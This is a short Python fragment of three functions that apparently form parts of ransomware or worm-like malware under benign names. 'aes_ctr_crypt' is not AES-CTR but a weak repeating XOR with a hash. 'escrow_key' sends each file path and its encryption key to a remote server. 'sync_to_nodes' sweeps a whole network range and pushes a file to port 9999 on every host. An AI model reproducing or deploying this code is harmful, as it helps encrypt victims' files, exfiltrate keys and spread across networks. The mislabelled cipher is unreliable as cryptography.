def aes_ctr_crypt(data: bytes, key: bytes, nonce: bytes) -> bytes:
    key_hash = hashlib.sha256(key + nonce).digest()
    return bytes(a ^ b for a, b in zip(data, (key_hash * (len(data) // 32 + 1))))

def escrow_key(server_addr: str, file_path: str, key: bytes) -> bool:
    try:
        host, port = server_addr.split(':')
        with socket.create_connection((host, int(port)), timeout=5) as sock:
            payload = json.dumps({"file": file_path, "key": key.hex()}).encode()
            sock.sendall(payload)
        return True
    except Exception as e:
        print(f"Escrow failed for {file_path} to {server_addr}: {e}")
        return False

def sync_to_nodes(network_range: str, file_path: str) -> None:
    try:
        net = ipaddress.ip_network(network_range, strict=False)
        with open(file_path, 'rb') as f:
            data = f.read()
        for ip in net.hosts():
            try:
                with socket.create_connection((str(ip), 9999), timeout=1) as sock:
                    sock.sendall(f"{os.path.basename(file_path)}:".encode() + data)
            except (socket.timeout, ConnectionRefusedError, OSError):
                continue
    except Exception as e:
        print(f"Sync error: {e}")

